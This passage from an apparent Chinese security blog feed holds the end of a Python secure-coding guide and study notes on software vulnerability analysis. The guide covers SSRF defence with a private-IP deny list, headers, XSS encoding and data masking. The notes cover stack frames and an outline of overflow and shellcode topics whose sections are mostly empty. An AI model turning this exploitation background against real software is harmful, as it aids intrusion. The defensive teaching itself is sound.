【必须】限定访问网络资源地址范围</h4><p>当程序需要从用户指定的<code>URL地址获取网页文本内容</code>、<code>加载指定地址的图片</code>、<code>进行下载</code>等操作时，需要对URL地址进行安全校验：</p><ol><li><p>只允许HTTP或HTTPS协议</p></li><li><p>解析目标URL，获取其host</p></li><li><p>解析host，获取host指向的IP地址转换成long型</p></li><li><p>检查IP地址是否为内网IP</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以RFC定义的专有网络为例，如有自定义私有网段亦应加入禁止访问列表。</span></span><br><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span></span><br><span class="line"><span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">12</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span></span><br></pre></td></tr></table></figure><ol start="5"><li><p>请求URL</p></li><li><p>如果有跳转，跳转后执行1，否则对URL发起请求</p></li></ol><h3 id="1-6-响应输出"><a href="#1-6-响应输出" class="headerlink" title="1.6 响应输出"></a>1.6 响应输出</h3><h4 id="1-6-1-【必须】设置正确的HTTP响应包类型"><a href="#1-6-1-【必须】设置正确的HTTP响应包类型" class="headerlink" title="1.6.1 【必须】设置正确的HTTP响应包类型"></a>1.6.1 【必须】设置正确的HTTP响应包类型</h4><p>响应包的HTTP头“Content-Type”必须正确配置响应包的类型，禁止非HTML类型的响应包设置为“text&#x2F;html”。</p><h4 id="1-6-2-【必须】设置安全的HTTP响应头"><a href="#1-6-2-【必须】设置安全的HTTP响应头" class="headerlink" title="1.6.2 【必须】设置安全的HTTP响应头"></a>1.6.2 【必须】设置安全的HTTP响应头</h4><ul><li><p>X-Content-Type-Options</p><p>添加“X-Content-Type-Options”响应头并将其值设置为“nosniff ”</p></li><li><p>HttpOnly<br> 控制用户登鉴权的Cookie字段 应当设置HttpOnly属性以防止被XSS漏洞&#x2F;JavaScript操纵泄漏。</p></li><li><p>X-Frame-Options</p><p>设置X-Frame-Options响应头，并根据需求合理设置其允许范围。该头用于指示浏览器禁止当前页面在frame、 iframe、embed等标签中展现。从而避免点击劫持问题。它有三个可选的值: DENY: 浏览器会拒绝当前页面加 载任何frame页面; SAMEORIGIN:则frame页面的地址只能为同源域名下的页面 ALLOW-FROM origin:可以定 义允许frame加载的页面地址。</p></li></ul><h4 id="1-6-3-【必须】对外输出页面包含第三方数据时须进行编码处理"><a href="#1-6-3-【必须】对外输出页面包含第三方数据时须进行编码处理" class="headerlink" title="1.6.3 【必须】对外输出页面包含第三方数据时须进行编码处理"></a>1.6.3 【必须】对外输出页面包含第三方数据时须进行编码处理</h4><ul><li>当响应“Content-Type”为“text&#x2F;html”类型时，需要对响应体进行编码处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 推荐使用mozilla维护的bleach库来进行过滤</span></span><br><span class="line"><span class="keyword">import</span> bleach</span><br><span class="line">bleach.clean(<span class="string">&#x27;an &lt;script&gt;evil()&lt;/script&gt; example&#x27;</span>)</span><br><span class="line"><span class="comment"># u&#x27;an &amp;lt;script&amp;gt;evil()&amp;lt;/script&amp;gt; example&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="1-7-数据输出"><a href="#1-7-数据输出" class="headerlink" title="1.7 数据输出"></a>1.7 数据输出</h3><h4 id="1-7-1-【必须】敏感数据加密存储"><a href="#1-7-1-【必须】敏感数据加密存储" class="headerlink" title="1.7.1 【必须】敏感数据加密存储"></a>1.7.1 【必须】敏感数据加密存储</h4><ul><li>敏感数据应使用SHA2、RSA等算法进行加密存储</li><li>敏感数据应使用独立的存储层，并在访问层开启访问控制</li><li>包含敏感信息的临时文件或缓存一旦不再需要应立刻删除</li></ul><h4 id="1-7-2-【必须】敏感信息必须由后台进行脱敏处理"><a href="#1-7-2-【必须】敏感信息必须由后台进行脱敏处理" class="headerlink" title="1.7.2 【必须】敏感信息必须由后台进行脱敏处理"></a>1.7.2 【必须】敏感信息必须由后台进行脱敏处理</h4><ul><li>敏感信息须再后台进行脱敏后返回，禁止接口返回敏感信息交由前端&#x2F;客户端进行脱敏处理。</li></ul><h4 id="1-7-3-【必须】高敏感信息禁止存储、展示"><a href="#1-7-3-【必须】高敏感信息禁止存储、展示" class="headerlink" title="1.7.3 【必须】高敏感信息禁止存储、展示"></a>1.7.3 【必须】高敏感信息禁止存储、展示</h4><ul><li>口令、密保答案、生理标识等鉴权信息禁止展示</li><li>非金融类业务，信用卡cvv码及日志禁止存储</li></ul><h4 id="1-7-4-【必须】个人敏感信息脱敏展示"><a href="#1-7-4-【必须】个人敏感信息脱敏展示" class="headerlink" title="1.7.4 【必须】个人敏感信息脱敏展示"></a>1.7.4 【必须】个人敏感信息脱敏展示</h4><p>在满足业务需求的情况下，个人敏感信息需脱敏展示。</p><ul><li>身份证只显示第一位和最后一位字符，如3****************1。</li><li>移动电话号码隐藏中间6位字符，如134******48。</li><li>工作地址&#x2F;家庭地址最多显示到“区”一级。</li><li>银行卡号仅显示最后4位字符，如************8639</li></ul><h4 id="1-7-5-【必须】隐藏后台地址"><a href="#1-7-5-【必须】隐藏后台地址" class="headerlink" title="1.7.5 【必须】隐藏后台地址"></a>1.7.5 【必须】隐藏后台地址</h4><ul><li>若程序对外提供了登录后台地址，应使用随机字符串隐藏地址。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不要采取这种方式</span></span><br><span class="line">admin_login_url = <span class="string">&quot;xxxx/login&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安全示例</span></span><br><span class="line">admin_login_url = <span class="string">&quot;xxxx/ranD0Str&quot;</span></span><br></pre></td></tr></table></figure><h3 id="1-8-权限管理"><a href="#1-8-权限管理" class="headerlink" title="1.8 权限管理"></a>1.8 权限管理</h3><h4 id="1-8-1-【必须】默认鉴权"><a href="#1-8-1-【必须】默认鉴权" class="headerlink" title="1.8.1 【必须】默认鉴权"></a>1.8.1 【必须】默认鉴权</h4><ul><li>除非资源完全可对外开放，否则系统默认进行身份认证（使用白名单的方式放开不需要认证的接口或页面）。</li></ul><h4 id="1-8-2-【必须】授权遵循最小权限原则"><a href="#1-8-2-【必须】授权遵循最小权限原则" class="headerlink" title="1.8.2 【必须】授权遵循最小权限原则"></a>1.8.2 【必须】授权遵循最小权限原则</h4><ul><li>程序默认用户应不具备任何操作权限。</li></ul><h4 id="1-8-3-【必须】避免越权访问"><a href="#1-8-3-【必须】避免越权访问" class="headerlink" title="1.8.3 【必须】避免越权访问"></a>1.8.3 【必须】避免越权访问</h4><ul><li>对于非公共操作，应当校验当前访问账号进行操作权限（常见于CMS）和数据权限校验。</li></ul><ol><li>验证当前用户的登录态；</li><li>从可信结构中获取经过校验的当前请求账号的身份信息（如：session），禁止从用户请求参数或Cookie中获取外部传入不可信用户身份直接进行查询；</li><li>校验当前用户是否具备该操作权限；</li><li>校验当前用户是否具备所操作数据的权限；</li><li>校验当前操作是否账户是否预期账户。</li></ol><h4 id="1-8-4-【建议】及时清理不需要的权限"><a href="#1-8-4-【建议】及时清理不需要的权限" class="headerlink" title="1.8.4 【建议】及时清理不需要的权限"></a>1.8.4 【建议】及时清理不需要的权限</h4><ul><li>程序应定期清理非必需用户的权限。</li></ul><h3 id="1-9-异常处理"><a href="#1-9-异常处理" class="headerlink" title="1.9 异常处理"></a>1.9 异常处理</h3><h4 id="1-9-1-【必须】不向对外错误提示"><a href="#1-9-1-【必须】不向对外错误提示" class="headerlink" title="1.9.1 【必须】不向对外错误提示"></a>1.9.1 【必须】不向对外错误提示</h4><ul><li>应合理使用<code>try/except/finally</code> 处理系统异常，避免出错信息输出到前端。</li><li>对外环境禁止开启debug模式，或将程序运行日志输出到前端。</li></ul><h4 id="1-9-2-【必须】禁止异常抛出敏感信息"><a href="#1-9-2-【必须】禁止异常抛出敏感信息" class="headerlink" title="1.9.2 【必须】禁止异常抛出敏感信息"></a>1.9.2 【必须】禁止异常抛出敏感信息</h4><h3 id="1-10-Flask安全"><a href="#1-10-Flask安全" class="headerlink" title="1.10 Flask安全"></a>1.10 Flask安全</h3><h4 id="1-10-1-【必须】生产环境关闭调试模式"><a href="#1-10-1-【必须】生产环境关闭调试模式" class="headerlink" title="1.10.1 【必须】生产环境关闭调试模式"></a>1.10.1 【必须】生产环境关闭调试模式</h4><h4 id="1-10-2-【建议】遵循Flask安全规范"><a href="#1-10-2-【建议】遵循Flask安全规范" class="headerlink" title="1.10.2 【建议】遵循Flask安全规范"></a>1.10.2 【建议】遵循Flask安全规范</h4><ul><li>参考Flask文档中的安全注意事项 <a href="https://flask.palletsprojects.com/en/latest/security/">https://flask.palletsprojects.com/en/latest/security/</a></li></ul><h3 id="1-11-Django安全"><a href="#1-11-Django安全" class="headerlink" title="1.11 Django安全"></a>1.11 Django安全</h3><h4 id="1-11-1-【必须】生产环境关闭调试模式"><a href="#1-11-1-【必须】生产环境关闭调试模式" class="headerlink" title="1.11.1 【必须】生产环境关闭调试模式"></a>1.11.1 【必须】生产环境关闭调试模式</h4><h4 id="1-11-2-【建议】保持Django自带的安全特性开启"><a href="#1-11-2-【建议】保持Django自带的安全特性开启" class="headerlink" title="1.11.2 【建议】保持Django自带的安全特性开启"></a>1.11.2 【建议】保持Django自带的安全特性开启</h4><ul><li><p>保持Django自带的安全特性开启 <a href="https://docs.djangoproject.com/en/3.0/topics/security/">https://docs.djangoproject.com/en/3.0/topics/security/</a></p></li><li><p>在默认配置下，Django自带的安全特性对XSS、CSRF、SQL注入、点击劫持等类型漏洞可以起到较好防护效果。应尽量避免关闭这些安全特性。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%80%9A%E7%94%A8%E7%B1%BB&quot;&gt;通用类&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#i-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0&quot;&gt;I. 代码实现&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a hre</summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="编程语言" scheme="https://dxhm.github.io/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="程序开发安全" scheme="https://dxhm.github.io/tags/%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="Python" scheme="https://dxhm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>ODAY-软件漏洞分析</title>
    <link href="https://dxhm.github.io/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://dxhm.github.io/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-01-05T17:36:47.000Z</published>
    <updated>2023-06-30T15:44:22.407Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">一、基础知识</a><ul><li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li><li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">逆向分析工具</a></li></ul></li><li><a href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">二、漏洞利用</a><ul><li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">栈溢出利用</a><ul><li><a href="#1-%E7%B3%BB%E7%BB%9F%E6%A0%88">1. 系统栈</a><ul><li><a href="#%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E6%8C%89%E5%8A%9F%E8%83%BD%E5%88%92%E5%88%86">进程使用的内存区域按功能划分</a></li><li><a href="#win32%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8%E7%94%A8%E4%BA%8E%E6%A0%87%E8%AF%86%E4%BD%8D%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%A0%88%E6%A0%88%E9%A1%B6%E7%9A%84%E6%A0%88%E5%B8%A7">Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</a></li><li><a href="#%E4%B8%8D%E5%90%8C%E7%BC%96%E8%AF%91%E5%99%A8%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E5%B7%AE%E5%BC%82">不同编译器调用方式差异</a></li><li><a href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数调用大致步骤：</a></li><li><a href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数返回大致步骤：</a></li><li><a href="#%E6%89%A9%E5%85%85%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E4%B9%A6%E7%B1%8Dibm-x86%E6%B1%87%E7%BC%96%E6%88%96win32%E6%B1%87%E7%BC%96">+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</a></li></ul></li><li><a href="#2-%E4%BF%AE%E6%94%B9%E9%82%BB%E6%8E%A5%E5%8F%98%E9%87%8F">2. 修改邻接变量</a></li><li><a href="#3-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80">3. 修改函数返回地址</a></li><li><a href="#4-%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5">4. 代码植入</a></li></ul></li><li><a href="#%E5%BC%80%E5%8F%91shellcode">开发shellcode</a></li><li><a href="#metasploit%E5%BC%80%E5%8F%91exploit">MetaSploit开发Exploit</a></li><li><a href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">堆溢出利用</a></li><li><a href="#windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">Windows异常处理机制</a></li><li><a href="#%E9%AB%98%E7%BA%A7%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">高级内存攻击技术</a></li><li><a href="#%E6%89%8B%E6%9C%BA%E9%87%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">手机里的缓冲区溢出</a></li><li><a href="#%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF">其他软件漏洞利用技术</a></li><li><a href="#windows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">Windows安全机制</a></li><li><a href="#gs">GS</a></li><li><a href="#safeseh">SafeSEH</a></li><li><a href="#dep">DEP</a></li><li><a href="#aslr">ASLR</a></li><li><a href="#sehop">SEHOP</a></li><li><a href="#%E5%A0%86%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%94%BB%E5%87%BB">堆保护与攻击</a></li></ul></li><li><a href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">三、漏洞挖掘</a></li><li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">四、漏洞分析</a></li></ul><h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol><li>BUG：功能性逻辑缺陷</li><li>漏洞：安全性逻辑缺陷（软件中缓冲区溢出漏洞、网站中跨站脚本xss漏洞、SQL注入漏洞等）</li><li>0day响应：<ol><li><a href="http://cve.mitre.org/" title="http://cve.mitre.org">CVE</a></li><li><a href="http://www.cert.org/" title="http://www.cert.org">CERT</a></li><li>微软安全中心”Black Tuesday“：每个月第二周星期二发布补丁</li></ol></li><li><strong>PE文件格式</strong>：Win32平台下可执行文件遵守的数据格式（“*.exe” &#x2F; “*.dll”等）<ol><li>.text：由编译器产生，存放二进制的机器码，是反汇编和调试的对象</li><li>.data：初始化的数据块（如：宏定义、全局变量、静态变量等）</li><li>.idata：可执行文件所使用的动态链接库等外来函数与文件的信息</li><li>.rsrc：存放程序的资源（如图标、菜单等）</li><li>.reloc 、.edata 、.tls 、.rdata</li></ol></li><li><strong>“虚拟内存”</strong>（非操作系统中的虚拟内存）：在用户模式下，用调试器看到的内存地址 [指Windows用户态内存隐射机制下的虚拟内存]</li><li><strong>PE文件与虚拟内存的映射</strong>：VA &#x3D; ImageBase + RVA<ol><li>文件偏移地址（File Offset）</li><li>装载基址（Image Base）</li><li>虚拟内存地址（Virtual Address,VA）</li><li>相对虚拟地址（Relative Virtual Address,RVA）</li></ol></li></ol><h2 id="逆向分析工具"><a href="#逆向分析工具" class="headerlink" title="逆向分析工具"></a>逆向分析工具</h2><ol><li><p>OllyDbg</p></li><li><p>SoftICE</p></li><li><p>WinDbg</p></li><li><p>IDE Pro</p></li><li><p>二进制编辑器（Ultra Edit、Hex Workshop、WinHex）</p></li><li><p>虚拟机</p></li><li><p>Crack二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//密码验证实验程序</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">   int authenticated;</span><br><span class="line">   authenticated=strcmp(password,PASSWORD);</span><br><span class="line">   return authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   int valid_flag = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h2><h3 id="1-系统栈"><a href="#1-系统栈" class="headerlink" title="1. 系统栈"></a>1. 系统栈</h3><ol><li><h4 id="进程使用的内存区域按功能划分"><a href="#进程使用的内存区域按功能划分" class="headerlink" title="进程使用的内存区域按功能划分"></a>进程使用的内存区域<strong>按功能</strong>划分</h4><ol><li>代码区：cpu在此区域取值执行</li><li>数据区：存储全局变量等</li><li>堆区：动态分配和回收。进程在堆区请求一定大小的内存</li><li>栈区：用于动态地存储函数间的调用关系，保证被调用函数在返回时恢复到母函数继续执行。</li></ol></li><li><h4 id="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"><a href="#Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧" class="headerlink" title="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"></a>Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</h4><ol><li>ESP（<a href="extended_stack_pointer" title="extended_stack_pointer">栈指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的顶部</strong></li><li>EBP（<a href="extended_base_pointer" title="extended_base_pointer">基址指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的底部</strong></li><li>当前函数栈帧：ESP和EBP之间的内存空间<ol><li>局部变量：为函数局部变量开辟内存空间</li><li>栈帧状态值：保存前栈帧的顶部和底部，用于本栈帧弹出后恢复上一个栈帧（实际只保存底部，顶部可以通过堆栈平衡计算得出）</li><li>函数返回地址：保存当前函数调用前的断点信息，也就是<strong>函数调用前的指令位置</strong></li></ol></li><li>另外的特殊寄存器：EIP（指令寄存器）存放下一条等待执行的指令地址</li></ol></li><li><h4 id="不同编译器调用方式差异"><a href="#不同编译器调用方式差异" class="headerlink" title="不同编译器调用方式差异"></a>不同编译器调用方式差异</h4></li></ol><table><thead><tr><th></th><th>C</th><th>SysCall</th><th>StdCall</th><th>BASIC</th><th>FORTRAN</th><th>PASCAL</th></tr></thead><tbody><tr><td>参数入栈顺序</td><td>右-&gt;左</td><td>右-&gt;左</td><td>右-&gt;左</td><td>左-&gt;右</td><td>左-&gt;右</td><td>左-&gt;右</td></tr><tr><td>恢复栈平衡操作的位置</td><td>母函数</td><td>子函数</td><td>子函数</td><td>子函数</td><td>子函数</td><td>子函数</td></tr></tbody></table><ol start="4"><li><h4 id="函数调用大致步骤："><a href="#函数调用大致步骤：" class="headerlink" title="函数调用大致步骤："></a>函数调用大致步骤：</h4><ol><li>参数入栈：按入栈顺序</li><li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈，供函数返回时继续执行</li><li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口</li><li>栈帧调整：<ol><li>EBP入栈：保存当前栈帧状态值，以供后面恢复本栈帧时使用</li><li>ESP装入EBP，更新栈帧底部：将当前栈帧切换到新栈帧</li><li>把ESP减去所需空间的大小，太高栈顶：给新栈帧分配空间</li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;假设函数有三个参数，依次入栈</span><br><span class="line">push canshu1    </span><br><span class="line">push canshu2    </span><br><span class="line">push canshu3    </span><br><span class="line">call 函数地址    ;call完成两项工作：a.保存返回地址（入栈当前指令在内存中的位置） b. 跳转到函数的入口地址</span><br><span class="line">push ebp    ;保存旧栈的栈底</span><br><span class="line">mov ebp ,esp    ;栈帧切换：新栈帧底替换旧栈底</span><br><span class="line">sub esp ,xxx    ;太高栈顶，为新栈帧开辟内存空间：设置新栈帧的栈顶</span><br></pre></td></tr></table></figure></li><li><h4 id="函数返回大致步骤："><a href="#函数返回大致步骤：" class="headerlink" title="函数返回大致步骤："></a>函数返回大致步骤：</h4><ol><li>保存返回值：通常保存在寄存器EAX</li><li>弹出当前栈帧，恢复上一个栈帧<ol><li>在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收空间</li><li>将（当前栈帧底部保存的）前栈帧EBP值 弹入 EBP寄存器，恢复出上一个栈帧</li><li>将函数返回地址弹给EIP寄存器</li></ol></li><li>跳转：按照返回地址跳回母函数继续执行</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add esp ,xxx    ;降低栈顶，回收当前栈帧</span><br><span class="line">pop ebp    ;将上一个栈帧底部位置恢复到ebp</span><br><span class="line">retn    ;两个功能：a. 弹出当前栈顶元素（栈帧中的返回地址） b.处理器跳转到弹出的返回地址，恢复调用之前的代码区</span><br></pre></td></tr></table></figure></li></ol><h4 id="扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》"><a href="#扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》" class="headerlink" title="+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》"></a>+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</h4><h3 id="2-修改邻接变量"><a href="#2-修改邻接变量" class="headerlink" title="2. 修改邻接变量"></a>2. 修改邻接变量</h3><h3 id="3-修改函数返回地址"><a href="#3-修改函数返回地址" class="headerlink" title="3. 修改函数返回地址"></a>3. 修改函数返回地址</h3><h3 id="4-代码植入"><a href="#4-代码植入" class="headerlink" title="4. 代码植入"></a>4. 代码植入</h3><h2 id="开发shellcode"><a href="#开发shellcode" class="headerlink" title="开发shellcode"></a>开发shellcode</h2><h2 id="MetaSploit开发Exploit"><a href="#MetaSploit开发Exploit" class="headerlink" title="MetaSploit开发Exploit"></a>MetaSploit开发Exploit</h2><h2 id="堆溢出利用"><a href="#堆溢出利用" class="headerlink" title="堆溢出利用"></a>堆溢出利用</h2><h2 id="Windows异常处理机制"><a href="#Windows异常处理机制" class="headerlink" title="Windows异常处理机制"></a>Windows异常处理机制</h2><h2 id="高级内存攻击技术"><a href="#高级内存攻击技术" class="headerlink" title="高级内存攻击技术"></a>高级内存攻击技术</h2><h2 id="手机里的缓冲区溢出"><a href="#手机里的缓冲区溢出" class="headerlink" title="手机里的缓冲区溢出"></a>手机里的缓冲区溢出</h2><h2 id="其他软件漏洞利用技术"><a href="#其他软件漏洞利用技术" class="headerlink" title="其他软件漏洞利用技术"></a>其他软件漏洞利用技术</h2><h2 id="Windows安全机制"><a href="#Windows安全机制" class="headerlink" title="Windows安全机制"></a>Windows安全机制</h2><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><h2 id="堆保护与攻击"><a href="#堆保护与攻击" class="headerlink" title="堆保护与攻击"></a>堆保护与攻击</h2><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86&quot;&gt;一、基础知识&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%AE%9A%E4%B9%89&quot;&gt;定义&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=</summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络空间安全" scheme="https://dxhm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞" scheme="https://dxhm.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Stack overflow" scheme="https://dxhm.github.io/tags/Stack-overflow/"/>
    
  </entry>
  
</feed>
